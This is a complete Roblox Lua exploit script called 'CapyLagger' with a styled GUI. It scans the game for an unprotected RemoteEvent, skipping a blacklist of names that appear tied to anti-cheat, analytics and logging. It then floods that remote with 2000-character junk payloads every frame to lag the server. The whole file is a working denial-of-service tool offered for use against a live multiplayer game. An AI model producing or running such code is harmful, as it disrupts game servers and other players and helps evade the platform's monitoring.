-- // SERVICES //
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

-- // BLACKLIST & SETTINGS //
local blacklistedNames = {
    "PlaceCooldownFromChat", "AdminPanelService", "AdminPanel",
    "IntegrityCheckProcessor", "LocalizationTableAnalyticsSender",
    "LocalizationService", "Analytics", "Telemetry", "Logger",
    "Reporter", "CanChatWith", "SetPlayerBlockList", "UpdatePlayerBlockList",
    "NewPlayerGroupDetails", "NewPlayerCanManageDetails", "SendPlayerBlockList",
    "UpdateLocalPlayerBlockList", "SendPlayerProfileSettings",
    "RequestPlayerProfileSettings", "UpdatePlayerProfileSettings",
    "ShowFriendJoinedPlayerToast", "ShowPlayerJoinedFriendsToast",
    "CreateOrJoinParty", "ServerSideBulkPurchaseEvent", "SetDialogInUse",
    "ContactListInvokeIrisInvite", "ContactListIrisInviteTeleport",
    "UpdateCurrentCall", "RequestDeviceCameraOrientationCapability",
    "ReceiveLikelySpeakingUsers", "ReferredPlayerJoin", "Update",
    "RE/Tools/Cooldown", "RE/FuseMachine/RevealNow", "RE/FuseMachine/FuseAnimation",
    "RE/NotificationService/Notify", "RE/PlotService/ClaimCoins",
    "RE/PlotService/Sell", "RE/PlotService/Open", "RE/PlotService/ToggleFriends",
    "RE/PlotService/CashCollected", "RE/ChatService/ChatMessage",
    "RE/SoundService/PlayClientSound", "RE/Snapshot/RealiableChannel",
    "RE/CommandsService/OpenCommandBar", "RE/92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
    "92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698", "6411a778-07a5-4513-b1c7-60b65ae05ac8",
    "RE/GameService/SpawnEffect", "RE/Leaderboard/ReplicateDisplayNames",
    "eb9dee81-7718-4020-b6b2-219888488d13", "fce51e06-a587-4ff0-9e19-869eb1859a01",
    "680db8c7-c46a-492c-b451-6e980910902c", "RE/StealService/Grab",
    "RE/PlotService/Place", "RE/StealService/StealingSuccess",
    "RE/StealService/StealingFailure", "RE/CombatService/ApplyImpulse",
    "RE/InventoryService/Sort", "RE/StockEventService/SetFocused",
    "RE/StockEventService/Return", "RE/StockEventService/Redeem",
    "RE/MerchantService/SetFocused", "RE/MerchantService/Animation",
    "RE/SantaMerchantService/SetFocused", "RE/SantaMerchantService/Animation",
    "RE/SantaMerchantService/CollectGoldElf", "RE/ShopService/Purchase",
    "RE/TutorialService/StartTutorial", "RE/TutorialService/FinishTutorial",
    "RE/TeleportService/Reconnect"
}

local priorityTargets = {
    "WhyAreTheyTargetingMe!!", "FisherMan", "Chat", "AFK", "CookiesService"
}

local Settings = {
    LagEnabled = false,
    PacketsPerSecond = 5,
    MaxPackets = 100
}

local TargetRemote = nil
local uuid = HttpService:GenerateGUID(false)

-- // UI LIBRARY //
local UI = {}

function UI:Create(class, properties)
    local instance = Instance.new(class)
    for k, v in pairs(properties) do
        instance[k] = v
    end
    return instance
end

function UI:Tween(instance, properties, duration, style)
    TweenService:Create(instance, TweenInfo.new(duration or 0.3, style or Enum.EasingStyle.Quint), properties):Play()
end

function UI:Gradient(parent)
    local gradient = UI:Create("UIGradient", {
        Parent = parent,
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 128)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 50, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
        })
    })
    
    -- Анимация вращения градиента
    task.spawn(function()
        local rotation = 0
        while gradient.Parent do
            rotation = rotation + 1
            if rotation > 360 then rotation = 0 end
            gradient.Rotation = rotation
            RunService.RenderStepped:Wait()
        end
    end)
    return gradient
end

-- // MAIN GUI SETUP //
if CoreGui:FindFirstChild("CapyLaggerUI") then CoreGui.CapyLaggerUI:Destroy() end

local ScreenGui = UI:Create("ScreenGui", {
    Name = "CapyLaggerUI",
    Parent = CoreGui,
    ResetOnSpawn = false
})

-- Main Container
local MainFrame = UI:Create("Frame", {
    Parent = ScreenGui,
    Size = UDim2.new(0, 260, 0, 300),
    Position = UDim2.new(0.5, -130, 0.4, 0),
    BackgroundColor3 = Color3.fromRGB(15, 15, 20),
    BorderSizePixel = 0,
    BackgroundTransparency = 0.05
})
UI:Create("UICorner", {Parent = MainFrame, CornerRadius = UDim.new(0, 16)})

-- RGB Stroke (Border)
local MainStroke = UI:Create("UIStroke", {
    Parent = MainFrame,
    Thickness = 2,
    Transparency = 0
})
UI:Gradient(MainStroke) -- Apply RGB

-- Top Bar
local TopBar = UI:Create("Frame", {
    Parent = MainFrame,
    Size = UDim2.new(1, 0, 0, 40),
    BackgroundTransparency = 1
})
local Title = UI:Create("TextLabel", {
    Parent = TopBar,
    Size = UDim2.new(1, 0, 1, 0),
    Text = "CapyLagger",
    Font = Enum.Font.GothamBold,
    TextSize = 22,
    TextColor3 = Color3.fromRGB(255, 255, 255),
    BackgroundTransparency = 1
})
-- Gradient Text
local TitleGradient = UI:Create("UIGradient", {
    Parent = Title,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 150, 0)), -- Capybara Orange
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 220, 100))
    })
})

-- Content Area
local Content = UI:Create("Frame", {
    Parent = MainFrame,
    Size = UDim2.new(1, -30, 1, -50),
    Position = UDim2.new(0, 15, 0, 45),
    BackgroundTransparency = 1
})

-- Status Panel
local StatusPanel = UI:Create("Frame", {
    Parent = Content,
    Size = UDim2.new(1, 0, 0, 35),
    BackgroundColor3 = Color3.fromRGB(25, 25, 30)
})
UI:Create("UICorner", {Parent = StatusPanel, CornerRadius = UDim.new(0, 8)})

local StatusDot = UI:Create("Frame", {
    Parent = StatusPanel,
    Size = UDim2.new(0, 8, 0, 8),
    Position = UDim2.new(0, 12, 0.5, -4),
    BackgroundColor3 = Color3.fromRGB(100, 100, 100)
})
UI:Create("UICorner", {Parent = StatusDot, CornerRadius = UDim.new(1, 0)})

local StatusText = UI:Create("TextLabel", {
    Parent = StatusPanel,
    Size = UDim2.new(1, -30, 1, 0),
    Position = UDim2.new(0, 30, 0, 0),
    Text = "Scanning Protocols...",
    Font = Enum.Font.Gotham,
    TextSize = 12,
    TextColor3 = Color3.fromRGB(180, 180, 180),
    BackgroundTransparency = 1,
    TextXAlignment = Enum.TextXAlignment.Left
})

-- Big Button
local ToggleBtn = UI:Create("TextButton", {
    Parent = Content,
    Size = UDim2.new(1, 0, 0, 80),
    Position = UDim2.new(0, 0, 0, 50),
    BackgroundColor3 = Color3.fromRGB(30, 30, 35),
    Text = "",
    AutoButtonColor = false
})
UI:Create("UICorner", {Parent = ToggleBtn, CornerRadius = UDim.new(0, 12)})
local BtnGradient = UI:Create("UIGradient", {
    Parent = ToggleBtn,
    Color = ColorSequence.new(Color3.fromRGB(30,30,35)),
    Enabled = true
})

local Icon = UI:Create("ImageLabel", {
    Parent = ToggleBtn,
    Size = UDim2.new(0, 40, 0, 40),
    Position = UDim2.new(0.5, -20, 0.5, -20),
    Image = "rbxassetid://6031068421", -- Power Icon
    ImageColor3 = Color3.fromRGB(100, 100, 100),
    BackgroundTransparency = 1
})

-- Slider
local SliderPanel = UI:Create("Frame", {
    Parent = Content,
    Size = UDim2.new(1, 0, 0, 50),
    Position = UDim2.new(0, 0, 0, 145),
    BackgroundTransparency = 1
})
local SliderTitle = UI:Create("TextLabel", {
    Parent = SliderPanel,
    Text = "Packet Intensity",
    Size = UDim2.new(1, 0, 0, 20),
    TextColor3 = Color3.fromRGB(200, 200, 200),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamMedium,
    TextSize = 12,
    TextXAlignment = Enum.TextXAlignment.Left
})
local SliderValue = UI:Create("TextLabel", {
    Parent = SliderPanel,
    Text = "5",
    Size = UDim2.new(1, 0, 0, 20),
    TextColor3 = Color3.fromRGB(255, 170, 0),
    BackgroundTransparency = 1,
    Font = Enum.Font.GothamBold,
    TextSize = 12,
    TextXAlignment = Enum.TextXAlignment.Right
})
local SliderTrack = UI:Create("TextButton", {
    Parent = SliderPanel,
    Size = UDim2.new(1, 0, 0, 6),
    Position = UDim2.new(0, 0, 0, 30),
    BackgroundColor3 = Color3.fromRGB(40, 40, 45),
    Text = "",
    AutoButtonColor = false
})
UI:Create("UICorner", {Parent = SliderTrack, CornerRadius = UDim.new(1, 0)})
local SliderFill = UI:Create("Frame", {
    Parent = SliderTrack,
    Size = UDim2.new(0.05, 0, 1, 0),
    BackgroundColor3 = Color3.fromRGB(255, 150, 0)
})
UI:Create("UICorner", {Parent = SliderFill, CornerRadius = UDim.new(1, 0)})

-- Footer
local Footer = UI:Create("TextLabel", {
    Parent = MainFrame,
    Size = UDim2.new(1, 0, 0, 20),
    Position = UDim2.new(0, 0, 1, -25),
    Text = "CapyLagger v2.0 - Stable",
    Font = Enum.Font.Gotham,
    TextSize = 10,
    TextColor3 = Color3.fromRGB(100, 100, 100),
    BackgroundTransparency = 1
})

-- // LOGIC FUNCTIONS //

local function UpdateButtonVisuals(state)
    if state then
        -- ON State
        UI:Tween(ToggleBtn, {BackgroundColor3 = Color3.fromRGB(255, 255, 255)})
        BtnGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 50)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 50))
        })
        UI:Tween(Icon, {ImageColor3 = Color3.fromRGB(255, 255, 255)})
        
        -- Pulse Effect
        task.spawn(function()
            while Settings.LagEnabled do
                UI:Tween(ToggleBtn, {Size = UDim2.new(1, -4, 0, 76), Position = UDim2.new(0, 2, 0, 52)}, 0.5)
                task.wait(0.5)
                if not Settings.LagEnabled then break end
                UI:Tween(ToggleBtn, {Size = UDim2.new(1, 0, 0, 80), Position = UDim2.new(0, 0, 0, 50)}, 0.5)
                task.wait(0.5)
            end
            -- Reset
            UI:Tween(ToggleBtn, {Size = UDim2.new(1, 0, 0, 80), Position = UDim2.new(0, 0, 0, 50)}, 0.2)
        end)
    else
        -- OFF State
        UI:Tween(ToggleBtn, {BackgroundColor3 = Color3.fromRGB(30, 30, 35)})
        BtnGradient.Color = ColorSequence.new(Color3.fromRGB(30, 30, 35))
        UI:Tween(Icon, {ImageColor3 = Color3.fromRGB(100, 100, 100)})
    end
end

ToggleBtn.MouseButton1Click:Connect(function()
    if not TargetRemote then return end
    Settings.LagEnabled = not Settings.LagEnabled
    UpdateButtonVisuals(Settings.LagEnabled)
    
    if Settings.LagEnabled then
        StatusText.Text = "Sending Heavy Packets..."
        StatusText.TextColor3 = Color3.fromRGB(255, 100, 100)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
    else
        StatusText.Text = "Connected: " .. TargetRemote.Name
        StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(0, 255, 150)})
    end
end)

-- Slider Logic
local dragging = false
SliderTrack.MouseButton1Down:Connect(function() dragging = true end)
UserInputService.InputEnded:Connect(function(input) 
    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end 
end)

RunService.RenderStepped:Connect(function()
    if dragging then
        local mPos = UserInputService:GetMouseLocation().X
        local rPos = mPos - SliderTrack.AbsolutePosition.X
        local perc = math.clamp(rPos / SliderTrack.AbsoluteSize.X, 0, 1)
        SliderFill.Size = UDim2.new(perc, 0, 1, 0)
        local val = math.max(1, math.floor(perc * Settings.MaxPackets))
        Settings.PacketsPerSecond = val
        SliderValue.Text = tostring(val)
    end
end)

-- // SCANNER //
local function Scan()
    local found = nil
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local name = v.Name
            local bad = false
            for _, b in pairs(blacklistedNames) do
                if string.find(v:GetFullName(), b, 1, true) or string.find(name, b, 1, true) then
                    bad = true; break
                end
            end
            if not bad then
                found = v
                break
            end
        end
    end
    
    TargetRemote = found
    
    if TargetRemote then
        StatusText.Text = "Connected: " .. TargetRemote.Name
        StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(0, 255, 150)})
    else
        StatusText.Text = "Failed: Not Supported"
        StatusText.TextColor3 = Color3.fromRGB(255, 50, 50)
        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
        ToggleBtn.AutoButtonColor = false
        Icon.ImageTransparency = 0.8
    end
end

-- // LAG LOGIC (INSTANT STOP) //
RunService.Heartbeat:Connect(function()
    if not Settings.LagEnabled or not TargetRemote then return end
    
    local payload = string.rep("X", 2000)
    for i = 1, Settings.PacketsPerSecond do
        if not Settings.LagEnabled then break end -- Instant Break
        pcall(function() TargetRemote:FireServer(uuid, payload) end)
    end
end)

-- // DRAGGING GUI //
local dragStart, startPos
local isDraggingGUI = false
MainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        isDraggingGUI = true; dragStart = input.Position; startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if isDraggingGUI and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then isDraggingGUI = false end
end)

-- Init
Scan()
